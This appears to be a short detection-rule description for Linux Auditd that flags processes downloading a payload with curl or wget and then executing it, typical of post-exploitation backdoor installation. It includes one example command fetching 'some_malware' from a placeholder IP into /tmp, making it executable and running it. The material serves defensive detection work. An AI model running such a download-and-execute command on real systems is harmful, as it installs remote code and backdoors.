## Auditd : execute payload from internet

Attempt to detect a process that is successively invoking `curl` or `wget` and executing a non-standard payload or script.

This pattern is usually seen in post-exploitation behaviors to when downloading and executing backdoors :

```bash
curl -o /tmp/smth http://X.X.X.X/some_malware ; chmod +x /tmp/smth ; /tmp/smth
```
